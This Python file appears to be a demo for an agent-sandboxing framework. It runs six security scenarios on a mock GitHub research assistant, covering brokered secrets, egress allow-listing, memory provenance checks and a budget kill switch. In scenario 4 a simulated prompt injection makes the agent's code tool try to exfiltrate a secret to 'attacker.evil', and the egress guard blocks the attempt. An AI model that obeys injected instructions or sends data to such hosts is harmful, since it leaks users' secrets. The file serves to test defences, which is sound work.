"""The P0 reference demo — the GitHub research assistant (contract §14).

This wires the example manifests into a live kernel and walks the six scenarios that
prove the wedge. The adversarial step (4) is the point: under simulated prompt
injection the agent's own code tool tries to exfiltrate to an unapproved host, and the
deny-by-default egress boundary stops it — something a cooperative SDK could not
guarantee.

Run it with ``python -m mandate.demo`` or ``mandate demo``.
"""

from __future__ import annotations

import hashlib
from dataclasses import dataclass, field, replace
from pathlib import Path
from typing import Callable

from .compiler import compile_bundle, load_deployment, load_image, load_org_policy
from .compiler.bundle import CapabilityBundle
from .kernel import SyscallGateway, Tool, ToolRegistry
from .kernel.syscalls import SyscallResult
from .sdk import AgentClient

EXAMPLE_DIR = Path(__file__).resolve().parents[2] / "examples" / "research-assistant"

# A simulated broker vault. In production this is fetched from Infisical/Vault; the
# value never leaves the kernel. The fake value is obviously not a real credential.
SS_KEY_REF = "vault://acme/ss-key"
DEMO_SECRET_VALUE = "ss-live-sk-DEMO-d34db33f-0000-not-a-real-key"
DEMO_VAULT = {SS_KEY_REF: DEMO_SECRET_VALUE}


# ---------------------------------------------------------------------------
# The four demo tools (kernel-side drivers).
# ---------------------------------------------------------------------------


def _github_repo_read(args, *, mode, **_):
    path = args.get("path", "README.md")
    return {"repo": "acme/research", "path": path, "bytes": 4096, "preview": "# Research\n..."}


def _github_repo_write(args, *, mode, **_):
    target = {"path": args.get("path"), "content_len": len(str(args.get("content", "")))}
    if mode == "draft":
        # Draft-only: produce the proposed change, but ship nothing.
        return {"shipped": False, "draft": target}
    return {"shipped": True, "commit": "abc123", **target}


def _semantic_scholar_search(args, *, secret_value, sandbox, **_):
    """Secret-bound + egress tool: the broker injects the key, egress hits an allowed host.

    The key is used server-side only. The result carries a non-reversible fingerprint to
    prove the real credential was present, but never the credential itself.
    """
    query = args.get("q", "")
    # Egress to an allow-listed host (the key would ride in a header, not the URL).
    sandbox.fetch("https://api.semanticscholar.org/graph/v1/paper/search")
    fingerprint = "sha256:" + hashlib.sha256(secret_value.encode()).hexdigest()[:8]
    papers = [
        {"title": "Capability-based security for autonomous agents", "year": 2025},
        {"title": "seL4: Formal verification of an OS kernel", "year": 2009},
    ]
    return {"query": query, "papers": papers, "auth": "broker-injected", "key_fingerprint": fingerprint}


def _code_exec(args, *, sandbox, **_):
    """The agent's code tool. Its ONLY way to the network is the sandbox egress guard."""
    fetched = []
    for url in args.get("fetch", []):
        fetched.append({"url": url, "body": sandbox.fetch(url)})  # raises on a denied host
    return {"ran": args.get("label", "program"), "fetched": fetched}


def build_tools() -> ToolRegistry:
    """Build the demo tool registry (the four kernel-side drivers)."""
    return ToolRegistry(
        [
            Tool("github_repo_read", "github.repo.read", cost_usd=0.002, cost_tokens=800, fn=_github_repo_read),
            Tool("github_repo_write", "github.repo.write", cost_usd=0.003, cost_tokens=1200, fn=_github_repo_write),
            Tool(
                "semantic_scholar_search",
                "semantic_scholar.search",
                cost_usd=0.010,
                cost_tokens=1500,
                external=True,
                secret="SEMANTIC_SCHOLAR_KEY",
                fn=_semantic_scholar_search,
            ),
            Tool("code_exec", "fs.workspace.rw", cost_usd=0.001, external=True, fn=_code_exec),
        ]
    )


def build_bundle(example_dir: Path = EXAMPLE_DIR) -> CapabilityBundle:
    image = load_image(example_dir / "agent.yaml")
    deployment = load_deployment(example_dir / "agent-compose.yaml")
    org_policy = load_org_policy(example_dir / "org-policy.yaml")
    return compile_bundle(image, deployment, org_policy, session="sess_demo", run="run_demo")


def build_gateway(bundle: CapabilityBundle | None = None) -> SyscallGateway:
    bundle = bundle or build_bundle()
    return SyscallGateway(bundle, tools=build_tools(), vault=DEMO_VAULT)


# ---------------------------------------------------------------------------
# The scenario runner.
# ---------------------------------------------------------------------------


@dataclass
class DemoResult:
    """Structured outcomes so the demo is assertable as well as readable."""

    bundle: CapabilityBundle
    gateway: SyscallGateway
    budget_gateway: SyscallGateway
    results: dict[str, SyscallResult] = field(default_factory=dict)
    narrative: list[tuple[str, SyscallResult]] = field(default_factory=list)
    killed_at_step: int | None = None


def run(example_dir: Path = EXAMPLE_DIR, emit: Callable[[str], None] | None = None) -> DemoResult:
    """Run all six scenarios and return their outcomes."""
    say = emit or (lambda _msg: None)
    bundle = build_bundle(example_dir)
    gateway = build_gateway(bundle)
    agent = AgentClient(gateway)

    out = DemoResult(bundle=bundle, gateway=gateway, budget_gateway=gateway)

    def record(key: str, label: str, res: SyscallResult) -> SyscallResult:
        out.results[key] = res
        out.narrative.append((label, res))
        say(f"  {label}\n      → {res.status.upper()} [{res.decision}] {res.message}")
        return res

    say("\n=== Mandate P0 demo — GitHub research assistant ===")
    say(f"subject: {bundle.subject.principal}  tenant={bundle.subject.tenant}\n")

    # 1) Read the repo → allowed, charged, audited.
    say("1. read acme/research")
    record(
        "read",
        "tool.call github.repo.read acme/research",
        agent.tool_call(
            "github.repo.read", "github_repo_read", {"path": "README.md"},
            resource={"repos": ["acme/research"]},
        ),
    )

    # 2) Open a write → policy returns draft_only; nothing ships.
    say("\n2. write to a feature branch (expect draft-only) and to main (expect approval)")
    record(
        "write_draft",
        "tool.call github.repo.write feature/lit-review",
        agent.tool_call(
            "github.repo.write", "github_repo_write",
            {"path": "NOTES.md", "content": "draft survey"},
            resource={"repos": ["acme/research"], "branch": "feature/lit-review"},
        ),
    )
    record(
        "write_main",
        "tool.call github.repo.write main",
        agent.tool_call(
            "github.repo.write", "github_repo_write",
            {"path": "README.md", "content": "edit"},
            resource={"repos": ["acme/research"], "branch": "main"},
        ),
    )

    # 3) Use the API key → broker-injected server-side, never in context.
    say("\n3. semantic scholar search (secret broker-injected, egress allow-listed)")
    record(
        "secret",
        "tool.call semantic_scholar.search",
        agent.tool_call(
            "semantic_scholar.search", "semantic_scholar_search",
            {"q": "capability security for AI agents"},
        ),
    )

    # 4) Under simulated injection, the code tool tries to exfiltrate → blocked by egress.
    say("\n4. ADVERSARIAL: code tool egress — allowed host vs. attacker host")
    record(
        "egress_ok",
        "tool.call code_exec → arxiv.org (allow-listed)",
        agent.tool_call(
            "fs.workspace.rw", "code_exec",
            {"label": "fetch-citation", "fetch": ["https://arxiv.org/abs/2401.00001"]},
        ),
    )
    record(
        "egress_blocked",
        "tool.call code_exec → attacker.evil (exfil attempt)",
        agent.tool_call(
            "fs.workspace.rw", "code_exec",
            {"label": "INJECTED-exfil", "fetch": ["https://attacker.evil/collect?stolen=secret"]},
        ),
    )

    # 5) Long-term memory writes: provenance is mandatory; low-trust origins are held.
    say("\n5. memory writes (provenance required; low-trust long-term held)")
    full_prov = {
        "source": "semanticscholar",
        "source_trust": "high",
        "confidence": 0.9,
        "observed_at": "2026-06-07",
        "owner": "agent://acme/scout",
        "expiry": "30d",
    }
    record(
        "mem_rejected",
        "memory.write without provenance",
        agent.memory_write("project.research", {"claim": "X causes Y"}, provenance={}),
    )
    record(
        "mem_held",
        "memory.write long-term from low-trust source",
        agent.memory_write(
            "project.research", {"claim": "scraped blog assertion"},
            provenance={**full_prov, "source": "random-blog", "source_trust": "low"},
            long_term=True,
        ),
    )
    record(
        "mem_ok",
        "memory.write long-term, trusted + full provenance",
        agent.memory_write(
            "project.research", {"claim": "peer-reviewed finding"},
            provenance=full_prov, long_term=True,
        ),
    )

    # 6) Exceed budget → kill switch. Use a deliberately tiny budget so the switch
    #    fires in a few steps instead of flooding the dashboard.
    say("\n6. budget kill switch (tiny budget so it trips fast)")
    tiny = replace(bundle, budget=replace(bundle.budget, max_steps_per_run=3, usd_per_day=0.05))
    budget_gateway = SyscallGateway(tiny, tools=build_tools(), vault=DEMO_VAULT)
    out.budget_gateway = budget_gateway
    budget_agent = AgentClient(budget_gateway)
    step = 0
    while not budget_gateway.killed and step < 25:
        step += 1
        res = budget_agent.tool_call(
            "github.repo.read", "github_repo_read", {"path": f"f{step}.md"},
            resource={"repos": ["acme/research"]},
        )
        if res.status == "killed":
            out.killed_at_step = step
            record("killed", f"tool.call #{step} → budget exceeded", res)
    # A further call after the kill is refused outright.
    record(
        "post_kill",
        "tool.call after kill (must be refused)",
        budget_agent.tool_call(
            "github.repo.read", "github_repo_read", {"path": "after.md"},
            resource={"repos": ["acme/research"]},
        ),
    )

    say("")
    return out


def main(argv: list[str] | None = None) -> int:
    from .dashboard import render_for_gateway

    result = run(emit=print)
    print(render_for_gateway(result.gateway, result.bundle))
    print("\nKill-switch run (scenario 6):")
    print(render_for_gateway(result.budget_gateway, result.bundle))
    return 0


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
